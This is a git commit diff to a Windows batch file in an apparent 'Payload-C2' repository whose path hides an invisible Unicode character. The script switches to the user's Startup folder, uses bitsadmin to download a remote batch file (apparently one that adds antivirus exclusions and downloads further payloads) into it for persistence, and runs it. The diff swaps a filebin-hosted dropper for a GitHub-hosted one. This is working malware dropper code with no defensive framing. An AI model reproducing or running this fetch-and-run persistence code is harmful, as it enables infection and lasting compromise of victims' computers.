31dfdd1615c6e428b3d2935423ca8b07ada5533c
DieFrikadelle <167648560+DieFrikadelle@users.noreply.github.com>
2025-06-16 21:06:03 +0200

    Update dl_excl+dl.bat

--- tester/saiko/saik0/kp⁭gjiu/bat/dl_excl+dl.bat
+++ tester/saiko/saik0/kp⁭gjiu/bat/dl_excl+dl.bat
@@ -1,6 +1,6 @@
 @echo off
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-bitsadmin /transfer update /download /priority FOREGROUND "https://filebin.net/l3kfdq5x46zv0ous/1.dropperselfmade.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\1.dropperselfmade.bat"
+bitsadmin /transfer update /download /priority FOREGROUND "https://raw.githubusercontent.com/DieFrikadelle/Payload-C2/refs/heads/main/tester/saiko/saik0/kp%E2%81%ADgjiu/bat/exclusion%2Bdownl_ps.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\exclusion+downl_ps.bat"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-start 1.dropperselfmade.bat
+start exclusion+downl_ps.bat
